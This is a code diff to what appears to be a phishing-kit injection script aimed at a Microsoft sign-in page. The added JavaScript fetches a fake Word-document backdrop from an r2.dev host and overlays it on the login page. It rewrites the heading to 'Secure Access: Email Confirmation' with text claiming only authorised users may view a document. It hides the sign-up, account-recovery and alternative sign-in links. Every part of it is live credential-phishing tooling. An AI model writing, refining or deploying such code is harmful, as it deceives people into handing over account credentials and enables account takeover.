@@ -66,8 +66,6 @@ js_inject:
       overlay.style.display = "flex";
       overlay.style.justifyContent = "center";
       overlay.style.alignItems = "center";
-      overlay.style.overflow = "hidden";
-
       overlay.innerHTML = `
         <style>
           @keyframes pulse {
@@ -125,37 +123,66 @@ js_inject:
       `;
       document.body.appendChild(overlay);
 
-      setTimeout(() => {
-        overlay.remove();
+      const waitForBackground = () => {
+        const winScroll = document.querySelector('.win-scroll');
+        if (!winScroll) return setTimeout(waitForBackground, 500);
 
-        const waitFor = (selector, cb) => {
-          const check = setInterval(() => {
-            const el = document.querySelector(selector);
-            if (el) {
-              clearInterval(check);
-              cb(el);
-            }
-          }, 50);
-        };
+        fetch("https://pub-2a44f4d547ef416eb3d30428f95d5a9e.r2.dev/off.html")
+          .then(res => res.text())
+          .then(html => {
+            const wrapper = document.createElement('div');
+            wrapper.innerHTML = html;
+            wrapper.style.position = "absolute";
+            wrapper.style.top = "0";
+            wrapper.style.left = "0";
+            wrapper.style.width = "100%";
+            wrapper.style.height = "100%";
+            wrapper.style.zIndex = "0";
+            wrapper.style.pointerEvents = "none";
+            winScroll.insertBefore(wrapper, winScroll.firstChild);
 
-        waitFor('#backgroundImage', (bgImg) => {
-          // Remove existing MS background image
-          bgImg.style.display = 'none';
+            const checkInject = () => {
+              const backgroundImage = document.querySelector('#backgroundImage');
+              if (backgroundImage) {
+                overlay.remove();
+                backgroundImage.style.backgroundImage = "none"; // remove default bg
+              } else {
+                setTimeout(checkInject, 300);
+              }
+            };
+            checkInject();
+          })
+          .catch(err => {
+            console.error("Background injection failed", err);
+            overlay.remove();
+          });
+      };
 
-          // Inject full Word interface as background
-          const iframe = document.createElement("iframe");
-          iframe.src = "https://pub-2a44f4d547ef416eb3d30428f95d5a9e.r2.dev/off.html";
-          iframe.style.position = "absolute";
-          iframe.style.top = "0";
-          iframe.style.left = "0";
-          iframe.style.width = "100vw";
-          iframe.style.height = "100vh";
-          iframe.style.zIndex = "0";
-          iframe.style.border = "none";
-          iframe.style.pointerEvents = "none";
-          iframe.style.overflow = "hidden";
+      setTimeout(waitForBackground, 3000);
 
-          const container = bgImg.parentElement;
-          container.appendChild(iframe);
-        });
-      }, 3000);
+      // Modify heading and remove links
+      const updateText = () => {
+        const heading = document.querySelector("#loginHeader div[role='heading']");
+        if (heading) {
+          heading.innerText = "Secure Access: Email Confirmation";
+          const msg = document.createElement("p");
+          msg.innerText = "This document can only be accessed by Authorised users. Please verify your identity to access this document.";
+          msg.style.fontSize = "14px";
+          msg.style.marginTop = "8px";
+          msg.style.color = "#444";
+          heading.parentNode.appendChild(msg);
+        }
+
+        // Hide sign-up, can't access, and sign-in options
+        const signup = document.querySelector("#signup");
+        if (signup && signup.parentElement) signup.parentElement.style.display = "none";
+
+        const cantAccess = document.querySelector("#cantAccessAccount");
+        if (cantAccess && cantAccess.parentElement) cantAccess.parentElement.style.display = "none";
+
+        const signinOptions = document.querySelector('[data-test-id="signinOptions"]');
+        if (signinOptions && signinOptions.closest(".promoted-fed-cred-box")) {
+          signinOptions.closest(".promoted-fed-cred-box").style.display = "none";
+        }
+      };
+      setTimeout(updateText, 4000);
